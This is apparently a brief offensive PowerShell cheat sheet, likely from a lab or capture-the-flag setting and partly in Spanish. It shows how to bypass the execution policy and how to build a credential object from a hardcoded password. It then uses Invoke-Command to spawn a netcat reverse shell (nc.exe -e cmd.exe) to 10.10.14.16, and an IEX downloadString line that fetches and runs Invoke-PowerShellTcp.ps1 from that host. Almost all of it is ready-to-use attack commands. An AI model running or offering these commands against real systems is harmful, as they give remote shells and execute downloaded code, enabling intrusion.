# Bypass de execution policy

```powershell
powerShell.exe -ExecutionPolicy Bypass .\script.ps1
```

Refs: https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/

# Invoke command providing credentials

```powershell
$userName = 'WORKGROUP\Hector'
$userPassword = 'l33th4x0rhector'
$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)
# ComputerName obtenida de los comandos: 
hostname
$env:COMPUTERNAME
[Environment]::MachineName

Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock {C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.16 4321}

Start-Process -FilePath 'powershell' -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.16/Invoke-PowerShellTcp.ps1')" -Credential $credObject
```